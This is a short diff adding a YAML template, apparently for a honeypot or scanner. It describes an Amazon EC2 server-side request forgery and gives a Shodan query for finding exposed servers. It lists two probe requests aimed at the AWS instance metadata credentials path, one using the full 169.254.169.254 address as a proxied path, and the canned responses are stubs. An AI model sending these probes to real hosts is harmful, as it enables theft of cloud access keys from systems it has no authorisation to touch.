@@ -1,0 +1,36 @@
+id: amazon-ec2-ssrf
+info:
+  name: Amazon EC2 - Server-side request forgery (SSRF)
+  author: DhiyaneshDk
+  description: SSRF vulnerability exists in Amazon EC2, or Amazon Elastic Compute
+    Cloud which is a web service provided by Amazon Web Services (AWS) that offers
+    resizable compute capacity in the cloud.
+  severity: critical
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: 'Server: EC2ws'
+  tags: aws,ec2,ssrf,amazon
+traps:
+- request:
+    method: GET
+    path: /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: AccessKeyIdSecretAccessKey
+- request:
+    method: GET
+    path: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
